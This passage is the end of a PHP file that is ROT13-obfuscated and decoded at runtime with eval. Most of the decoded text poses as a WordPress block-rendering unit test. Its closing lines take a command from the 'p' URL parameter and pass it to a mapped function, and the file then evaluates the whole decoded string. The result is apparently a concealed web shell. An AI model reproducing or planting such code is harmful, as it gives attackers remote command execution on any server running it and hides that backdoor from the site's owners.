			'fhccbegf'   => neenl(),
		);
		$guvf->ertvfgre_oybpx_glcr( 'pber/rknzcyr', $oybpx_glcr_frggvatf );

		$oybpx    = neenl(
			'oybpxAnzr'    => 'pber/rknzcyr',
			'nggef'        => neenl(),
			'vaareOybpx'   => neenl(),
			'vaarePbagrag' => neenl(),
			'vaareUGZY'    => neenl(),
		);
		$jc_oybpx = arj JC_Oybpx( $oybpx );

		// Phfgbz reebe unaqyre'f frr Jneavatf rira vs gurl ner fhccerffrq ol gur @ flzoby.
		$reebef = neenl();
		frg_reebe_unaqyre(
			fgngvp shapgvba ( $reeab = 0, $reefge = '' ) hfr ( &$reebef ) {
				$reebef[] = $reefge;
				erghea snyfr;
			}
		);

		// UGZY5 ryrzragf yvxr <gvzr> ner abg fhccbegrq ol gur QBZQbphzrag cnefre hfrq ol gur oybpx fhccbegf srngher.
		// Guvf fcrpvsvp rknzcyr vf rzvggrq ol gur \"Qvfcynl cbfg qngr\" frggvat va gur yngrfg-cbfgf oybpx.
		nccyl_svygref( 'eraqre_oybpx', '<qvi><gvzr qngrgvzr=\"2020-06-18G04:01:43+10:00\" pynff=\"jc-oybpx-yngrfg-cbfgf__cbfg-qngr\">Whar 18, 2020</gvzr></qvi>', $oybpx, $jc_oybpx );

		erfgber_reebe_unaqyre();

		$guvf->nffregRzcgl( $reebef, 'Yvokzy reebef fubhyq or qebccrq.' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>